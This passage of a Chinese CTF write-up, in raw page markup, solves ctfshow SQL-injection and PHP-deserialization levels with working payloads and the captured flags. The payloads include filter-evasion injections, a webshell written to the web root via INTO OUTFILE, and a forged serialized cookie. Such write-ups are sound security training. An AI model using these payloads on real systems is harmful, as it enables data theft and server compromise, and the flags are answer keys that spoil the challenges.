<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>过滤了数字，可以用 replace 函数进行数字替换</p>\n<pre><code>payload:\n99' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&quot;1&quot;,&quot;!&quot;),&quot;2&quot;,&quot;@&quot;),&quot;3&quot;,&quot;#&quot;),&quot;4&quot;,&quot;$&quot;),&quot;5&quot;,&quot;%&quot;),&quot;6&quot;,&quot;^&quot;),&quot;7&quot;,&quot;&amp;&quot;),&quot;8&quot;,&quot;*&quot;),&quot;9&quot;,&quot;(&quot;),&quot;0&quot;,&quot;)&quot;) from ctfshow_user4 where username='flag\n</code></pre>\n<pre><code>ctfshow&#123;3892228b-3a70-4a05-bf92-9b515fa4c2b9&#125;\n</code></pre>\n<h2 id=\"web175\"><a class=\"anchor\" href=\"#web175\">#</a> web175</h2>\n<pre><code>//检查结果是否有flag\n    if(!preg_match('/[\\x00-\\x7f]/i', json_encode($ret)))&#123;\n      $ret['msg']='查询成功';\n    &#125;\n</code></pre>\n<pre><code>利用base64写一句话木马连接\n\n首先把一句话木马加密成base64在加密成url编码，在执行到web地址里\n\n/api/config.php里面有数据库账号密码\n\npayload:\n99' union select 1,from_base64('%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4a%32%45%6e%58%53%6b%37%50%7a%34%3d') into outfile '/var/www/html/1.php\n</code></pre>\n<pre><code>ctfshow&#123;937177d2-74e9-4c06-b41c-73335765d568&#125;\n</code></pre>\n<h2 id=\"web176\"><a class=\"anchor\" href=\"#web176\">#</a> web176</h2>\n<p>查询语句</p>\n<pre><code>//拼接sql语句查找指定ID用户\n$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;;\n      \n</code></pre>\n<p>返回逻辑</p>\n<pre><code>//对传入的参数进行了过滤\n  function waf($str)&#123;\n   //代码过于简单，不宜展示\n  &#125;\n      \n</code></pre>\n<figure class=\"highlight plaintext\"><figcaption data-lang=\"plaintext\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤了一些内容，但我们无法查看</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>试过之后发现是过滤了关键字，大小写绕过即可</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload1(万能密码):</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>1’ or 1=1--+</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>payload2:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>1' union select 1,2,3--+\t//发现没回显，可能是过滤掉了</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>1' UniOn SelEct 1,2,database()--+\t\t//大小写绕过有回显得到数据库名</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>//爆表</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>1' UniOn SelEct 1,(SelEct group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()--+</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>//爆字段</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>1' UniOn SelEct 1,(SelEct group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()--+</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>//爆字段内容</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>1' UniOn SelEct 1,(SelEct group_concat(password) from ctfshow_user),database()--+</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>得到flag</pre></td></tr></table></figure><pre><code>ctfshow&#123;9cf120a8-bb3a-4861-b234-f258cc19354f&#125;\n</code></pre>\n<h2 id=\"web177\"><a class=\"anchor\" href=\"#web177\">#</a> web177</h2>\n<p>查询语句</p>\n<pre><code>//拼接sql语句查找指定ID用户\n$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;;\n      \n</code></pre>\n<p>返回逻辑</p>\n<pre><code>//对传入的参数进行了过滤\n  function waf($str)&#123;\n   //代码过于简单，不宜展示\n  &#125;\n      \n</code></pre>\n<pre><code>过滤了空格\npayload：1'/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username/**/='flag'%23\n</code></pre>\n<pre><code>ctfshow&#123;0cfae509-b430-4d65-a829-5df539518b92&#125;\n</code></pre>\n<h2 id=\"web178\"><a class=\"anchor\" href=\"#web178\">#</a> web178</h2>\n<p>查询语句</p>\n<pre><code>//拼接sql语句查找指定ID用户\n$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;;\n      \n</code></pre>\n<p>返回逻辑</p>\n<pre><code>//对传入的参数进行了过滤\n  function waf($str)&#123;\n   //代码过于简单，不宜展示\n  &#125;\n      \n</code></pre>\n<pre><code>过滤了空格、*等，用%09绕过\n\npayload1:\n1'%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username%09='flag'%23\n\npayload2:\n1'%0bunion%0bselect%0b1,2,password%0bfrom%0bctfshow_user%0bwhere%0busername%0b='flag'%23\n\npayload3:\n1'or'1'='1'%23\n</code></pre>\n<pre><code>ctfshow&#123;bada9a8a-ef29-4f86-9d33-7e4f35d708c7&#125;\n</code></pre>\n<h2 id=\"web179\"><a class=\"anchor\" href=\"#web179\">#</a> web179</h2>\n<p>查询语句</p>\n<pre><code>//拼接sql语句查找指定ID用户\n$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;;\n      \n</code></pre>\n<p>返回逻辑</p>\n<pre><code>//对传入的参数进行了过滤\n  function waf($str)&#123;\n   //代码过于简单，不宜展示\n  &#125;\n      \n</code></pre>\n<pre><code>新过滤了%09\n\npayload：\n99'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername%0c='flag'%23\n</code></pre>\n<pre><code>ctfshow&#123;f7254fe5-7159-42ab-b5f3-cdbb5c7de8c3&#125;\n</code></pre>\n<h1 id=\"反序列化\"><a class=\"anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<h2 id=\"web254\"><a class=\"anchor\" href=\"#web254\">#</a> web254</h2>\n<p>开始反序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-02 19:29:02</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>username<span class=\"token operator\">=</span>xxxxxx<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>xxxxxx</pre></td></tr></table></figure><pre><code>ctfshow&#123;c7ae2016-c828-4005-b0c7-de10418de1eb&#125;\n</code></pre>\n<h2 id=\"web255\"><a class=\"anchor\" href=\"#web255\">#</a> web255</h2>\n<p>开始反序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-02 19:29:02</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>审计代码</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$user = unserialize($_COOKIE['user']); </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>将反序列化的结果赋值给user并传入cookie</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>//在本地输出序列化结果，将vip改为true</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload:</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>GET输出?username=xxxxxx&amp;password=xxxxxx</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Cookie:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</pre></td></tr></table></figure><pre><code>ctfshow&#123;41cb227c-9295-4cb1-ba53-a9c5a838820e&#125;\n</code></pre>\n<h2 id=\"web256\"><a class=\"anchor\" href=\"#web256\">#</a> 